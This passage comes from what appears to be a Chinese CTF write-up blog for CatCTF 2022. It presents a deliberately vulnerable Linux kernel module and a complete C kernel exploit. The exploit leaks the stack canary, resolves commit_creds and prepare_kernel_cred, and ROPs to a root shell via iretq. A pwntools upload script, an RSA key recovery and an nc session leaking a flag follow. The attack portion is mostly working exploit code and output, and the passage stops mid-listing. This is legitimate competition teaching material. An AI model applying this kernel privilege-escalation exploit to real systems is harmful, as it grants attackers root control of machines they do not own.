PTR_ERR(HRP_module_device);</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] HRP module register successful. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">HRP_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//退出时，依次清理生成的device, class和chrdev。这样就将系统/dev下的设备文件删除，并自动注销了/proc/devices的设备。</span></span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Start to clean up module.\n&quot;</span>);</span><br><span class="line">        device_destroy(HRP_module_class, MKDEV(majorNumber, <span class="number">0</span>));</span><br><span class="line">        class_destroy(HRP_module_class);</span><br><span class="line">        unregister_chrdev(majorNumber, DEVICE_NAME);</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[HRPModule:] Clean up successful. Bye.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(HRP_init);</span><br><span class="line">module_exit(HRP_exit);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h4><p>这里是构造qmemcpy进行溢出，这个内存复制操作只有汇编能完成这样的溢出，普通的strcpy，memcpy会被GCC编译的时候在函数里直接强塞检测函数，杜绝了溢出操作，所以在现实中，真有这么操蛋的溢出基本上是不可能的，只是为了学习研究。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">                <span class="string">&quot;mov $0x100,%rcx;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov $pwn,%rsi;&quot;</span></span><br><span class="line">                <span class="string">&quot;mov %rsp,%rdi;&quot;</span></span><br><span class="line">                <span class="string">&quot;xor %eax,%eax;&quot;</span></span><br><span class="line">                <span class="string">&quot;rep movsb;&quot;</span></span><br><span class="line">                );</span><br></pre></td></tr></table></figure>

<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>先看read函数，泄露canary</p>
<p>这里copy_to_user可以把内核空间的数据给到用户，大小限制固定0x40，刚好buf数组大小也是0x40，所以在EXP里面到时候read回来的时候下标为0的地方就是canary了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_read</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">char</span> __user * user , <span class="type">size_t</span> size, <span class="type">loff_t</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> this_buf[<span class="number">0x40</span>]=<span class="string">&quot;welcome to my house\n&quot;</span>;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY read\n&quot;</span>);</span><br><span class="line">    copy_to_user(user,&amp;this_buf[size],<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>write函数可以把用户的数据给到内核中，这里是保存在BSS段上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">HRP_module_write</span> <span class="params">(<span class="keyword">struct</span> file * file, <span class="type">const</span> <span class="type">char</span> __user * user, <span class="type">size_t</span> size, <span class="type">loff_t</span> * p)</span></span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;USE MY write\n&quot;</span>);</span><br><span class="line">    copy_from_user(pwn,user, size);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">114514</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合ioctl中的内存复制操作，可以造成很大的溢出。</p>
<p>这样思路就很简单的，填充canary，填充用户态利用函数地址就行了。</p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><p>我开启了动态地址随机化，所以在init提前保存了习惯地址，给选手用来计算偏移，find_symbols函数就是计算offset和寻找真实地址的</p>
<p>save_status函数是用来保存用户态的栈情况的，从内核到用户态的过程中，栈情况是内核的，如果最后返回到用户态执行完了代码但是咩有还原到用户态的栈，你执行了也没用的还是sh是不会返回给你的。</p>
<p>get函数用来修改uid的，执行commit_creds(prepare_kernel_cred(0))修改UID到root，下面的汇编就是用来切换到用户态并且执行shell 的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push $shell;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="comment">void* (*prepare_kernel_cred)(void*) KERNCALL = 0xffffffff810cd0a0;</span></span><br><span class="line"><span class="comment">void (*commit_creds)(void*) KERNCALL = 0xffffffff810ccc30;*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0xccc30</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0xcd0a0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void get()&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">    asm(</span></span><br><span class="line"><span class="comment">        &quot;swapgs;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_ss;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_sp;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_rflags;&quot;</span></span><br><span class="line"><span class="comment">        &quot;pushq user_cs;&quot;</span></span><br><span class="line"><span class="comment">        &quot;push $shell;&quot;</span></span><br><span class="line"><span class="comment">        &quot;iretq;&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushq user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push $shell;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getshell!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        save_status();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">        <span class="type">int</span> fd;</span><br><span class="line">        fd = open(<span class="string">&quot;/dev/test&quot;</span>, O_RDWR); <span class="comment">//我们的设备挂载在/dev/test处</span></span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">&quot;Failed to open the device...&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Open device successful!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">        </span><br><span class="line">        read(fd,buf,<span class="number">0x40</span>);</span><br><span class="line">        <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line">        <span class="type">size_t</span> rbp = ((<span class="type">size_t</span> *)buf)[<span class="number">4</span>];</span><br><span class="line">        </span><br><span class="line">        find_symbols();</span><br><span class="line">        <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        rop[<span class="number">2</span>] = canary;</span><br><span class="line">        rop[<span class="number">3</span>] = rbp;</span><br><span class="line">        rop[<span class="number">4</span>] = &amp;get;                 <span class="comment">// rip </span></span><br><span class="line">        write(fd,rop,<span class="number">0x100</span>);</span><br><span class="line">        ioctl(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exploit -no-pie -static</span><br></pre></td></tr></table></figure>

<h4 id="上传脚本-1"><a href="#上传脚本-1" class="headerlink" title="上传脚本"></a>上传脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">r</span>):</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cd /tmp&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;stty -echo&#x27;</span>)</span><br><span class="line">    <span class="comment">#os.system(&#x27;musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp&#x27;)</span></span><br><span class="line">    os.system(<span class="string">&#x27;gzip -c ./exp &gt; ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)</span><br><span class="line">    r.sendline((read(<span class="string">&#x27;./exp.gz&#x27;</span>)).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;gunzip ./exp.gz&#x27;</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">&#x27;chmod +x ./exp&#x27;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./startvm.sh&#x27;, shell=True)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12132</span>)</span><br><span class="line"> </span><br><span class="line">exploit(p)</span><br></pre></td></tr></table></figure>

<h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>调试的时候把init文件改成root用户，在启动脚本那把kalsr改成nokalsr，方便调试，具体操作可以加载符号表那些看我的mygdbinit</p>
<p>驱动加载地址用lsmod查看，找gadget自己用ropper找吧，ropgadget算是寄了。还有题目的vmlinux提取用下面这个</p>
<p>因此还有一个工具可以使用：<code>vmlinux-to-elf</code></p>
<blockquote>
<p>使用这个工具之前系统中必须装有<strong>高于3.5</strong>版本的python</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPYsudo apt install python3-pip</span><br><span class="line">sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>

<p>使用方式：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY# vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure>

<p>之后解压出来的 vmlinux 就是带符号的，可以正常被 gdb 读取和下断点。</p>
<p>调试用gef，不卡顿，不会有符号表问题，用就完事了</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install capstone unicorn keystone-engine ropper</span><br><span class="line">git clone https://github.com/hugsy/gef.git</span><br><span class="line">echo source `pwd`/gef/gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<p>调试细节那些，打断点很讲究，尽量不要打在push rbp上；然后直接多看看内核驱动报错，可以看见出问题的地址，变相送个调试器（不是）</p>
<h3 id="zip💼"><a href="#zip💼" class="headerlink" title="zip💼"></a>zip💼</h3><p>分析发现此题实现的zlib压缩，unzip需要购买root，root的CDK根据题目提示</p>
<p>n&#x3D;221 e&#x3D;7，可以联想到RSA，分析CDK检测算法发现3个字符串结果的比对，尝试RSA解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">c,e,p,q</span>):</span><br><span class="line">  L=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">  d=gmpy2.invert(e,L)</span><br><span class="line">  n=p*q</span><br><span class="line">  m=gmpy2.powmod(c,d,n)</span><br><span class="line">  flag=<span class="built_in">chr</span>(m)</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  p =  <span class="number">17</span></span><br><span class="line">  q =  <span class="number">13</span></span><br><span class="line">  e =  <span class="number">7</span></span><br><span class="line">  c =  <span class="number">149</span></span><br><span class="line">  Decrypt(c,e,p,q)</span><br><span class="line">  c=<span class="number">108</span></span><br><span class="line">  Decrypt(c,e,p,q)</span><br><span class="line">  c=<span class="number">24</span></span><br><span class="line">  Decrypt(c,e,p,q)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到CDK就是HRP</p>
<p>zip可以压缩任何文件并指定压缩后文件名，直接把flag或者&#x2F;bin&#x2F;sh压缩为pwn，此时不会影响程序运行，因为程序此时没有结束是被挂载在proc目录下的。</p>
<p>unzip只能输入一个字符，但是这里不难发现unzip和zip都是被main所调用的并且filename变量大小都是一样的，利用子函数同栈内存大小相等，在unzip的时候发送Ctrl+D(手动输入)，程序就会结束输入，这样unzip的默认filename就是上次在zip输入的压缩后的文件名，也就是pwn。</p>
<p>等下次再去nc题目的时候就会执行报错得到flag（同文件名覆盖不影响权限）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">q@ubuntu:~$ nc <span class="number">121.37</span><span class="number">.24</span><span class="number">.208</span> <span class="number">49472</span></span><br><span class="line"><span class="number">1.</span>zip</span><br><span class="line"><span class="number">2.u</span>nzip</span><br><span class="line"><span class="number">3.b</span>uy root</span><br><span class="line"><span class="number">3</span></span><br><span class="line">请输入CDK：</span><br><span class="line">HRP</span><br><span class="line"></span><br><span class="line">start…………………………</span><br><span class="line"><span class="number">1.</span>zip</span><br><span class="line"><span class="number">2.u</span>nzip</span><br><span class="line"><span class="number">3.b</span>uy root</span><br><span class="line"><span class="number">1</span></span><br><span class="line">file</span><br><span class="line">flag</span><br><span class="line">zip file</span><br><span class="line">pwn</span><br><span class="line"><span class="number">1.</span>zip</span><br><span class="line"><span class="number">2.u</span>nzip</span><br><span class="line"><span class="number">3.b</span>uy root</span><br><span class="line"><span class="number">2</span></span><br><span class="line">zip file</span><br><span class="line">^C</span><br><span class="line">q@ubuntu:~$ nc <span class="number">121.37</span><span class="number">.24</span><span class="number">.208</span> <span class="number">49472</span></span><br><span class="line">./pwn: <span class="number">1</span>: ./pwn: flag&#123;ReT0_fFPeTM0s2VjtU3kN&#125;: not found</span><br></pre></td></tr></table></figure>

<h4 id="非预期-1"><a href="#非预期-1" class="headerlink" title="非预期"></a>非预期</h4><p>榜一大哥Esifiel  的题解</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/image_CXtWBWhKkS.png" class="">

<h4 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 